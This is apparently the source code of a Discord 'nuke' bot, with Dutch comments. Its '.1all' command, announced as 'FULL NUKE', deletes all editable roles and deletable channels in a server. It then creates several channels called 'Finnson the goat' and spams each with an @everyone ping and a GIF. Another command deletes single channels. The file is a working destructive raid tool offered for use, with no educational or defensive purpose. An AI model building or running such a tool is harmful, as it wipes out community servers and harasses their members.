import { Client, GatewayIntentBits, PermissionsBitField } from 'discord.js';
import http from 'http';

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const PREFIX = '.1';
const GIF_URL = "https://cdn.discordapp.com/attachments/1522698849276268634/1522701428466909326/togif.gif";

// HTTP server voor Render
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot is running!');
}).listen(3000);

client.once('ready', () => {
    console.log(`✅ Bot is online als ${client.user.tag}`);
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift()?.toLowerCase();
    const createAmount = parseInt(args[0]) || 6; // standaard 6 channels

    if (command === 'all') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply("❌ Administrator rechten nodig!");
        }

        try {
            await message.author.send(`⚠️ **FULL NUKE** ⚠️\nAlles wordt eerst verwijderd.\nOver 10 seconden worden ${createAmount} channels "Finnson the goat" aangemaakt.\n\nTyp \`.1cancel\` om te stoppen.`);
        } catch {}

        let cancelled = false;
        const collector = message.channel.createMessageCollector({
            filter: m => m.author.id === message.author.id && m.content.toLowerCase() === '.1cancel',
            time: 6000
        });
        collector.on('collect', () => cancelled = true);

        await new Promise(r => setTimeout(r, 6000));
        if (cancelled) return;

        // 1. Rollen verwijderen
        await message.reply("🗑️ **Rollen verwijderen...**");
        for (const role of message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).values()) {
            try { await role.delete(); await new Promise(r => setTimeout(r, 300)); } catch {}
        }

        // 2. Channels verwijderen
        await message.channel.send("🗑️ **Channels verwijderen...**");
        for (const channel of message.guild.channels.cache.filter(ch => ch.deletable).values()) {
            try { await channel.delete(); await new Promise(r => setTimeout(r, 250)); } catch {}
        }

        await message.channel.send("⏳ Wachten 10 seconden voordat nieuwe channels worden aangemaakt...");

        // 10 seconden wachten
        await new Promise(r => setTimeout(r, 10000));

        // 3. Nieuwe channels aanmaken
        await message.channel.send(`🔨 Nu **${createAmount}** channels "Finnson the goat" aanmaken...`);

        let created = 0;
        for (let i = 1; i <= createAmount; i++) {
            try {
                const newChannel = await message.guild.channels.create({
                    name: "Finnson the goat",
                    type: 0,
                });
                await newChannel.send(`@everyone\n${GIF_URL}`);
                created++;
                await new Promise(r => setTimeout(r, 600));
            } catch (err) {
                console.error(err);
            }
        }

        await message.channel.send(`✅ **Klaar!** ${created} channels aangemaakt.`);
        return;
    }

    // Normale .1 delete
    let targetChannel = args.length > 0 ? message.mentions.channels.first() : message.channel;
    if (targetChannel) {
        try {
            await targetChannel.delete();
            if (targetChannel.id !== message.channel.id) {
                message.reply(`🗑️ **${targetChannel.name}** verwijderd.`).catch(() => {});
            }
        } catch {
            message.reply("❌ Kon niet verwijderen.").catch(() => {});
        }
    }
});

client.login(process.env.TOKEN);
